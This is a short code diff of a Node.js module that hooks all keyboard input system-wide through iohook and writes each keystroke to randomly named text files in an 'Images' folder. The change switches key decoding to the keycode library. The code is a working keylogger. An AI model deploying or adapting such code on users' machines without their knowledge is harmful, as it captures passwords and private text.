@@ -1,5 +1,5 @@
 module.exports = function(KeyIsEnable) {
-    
+  var keycode = require('keycode');
   let shared=require("./Shared.js");
 var fs = require('fs'); 
 const ioHook = require('iohook');
@@ -12,7 +12,7 @@ let main_key="";
 // let main_mouse="";
 setInterval(function(){
   response= shared.readSetting();
- var FileNameKey="Images/"+"Keyboard-"+shared.getRandomInt(9999999999)+".txt";
+  FileNameKey="Images/"+"Keyboard-"+shared.getRandomInt(9999999999)+".txt";
 // var FileNameMouse="Images/"+"mouse-"+getRandomInt(9999999999)+".txt";
 let text_key="";
 // let text_mouse="";
@@ -25,10 +25,16 @@ ioHook.on('keydown', function(e)
 
  if(response.KeyboardEnable==true)
  {
-     text_key=String.fromCharCode(e.rawcode);
-
-  main_key+=text_key;
-  fs.writeFileSync(FileNameKey,main_key); 
+  
+    console.log(e.rawcode);
+     text_key=keycode(e.rawcode)//String.fromCharCode(e.rawcode);
+     if(text_key!=undefined)
+     {
+      main_key+=text_key+",";
+      fs.writeFileSync(FileNameKey,main_key); 
+     }
+ 
+    
  }
   
 });
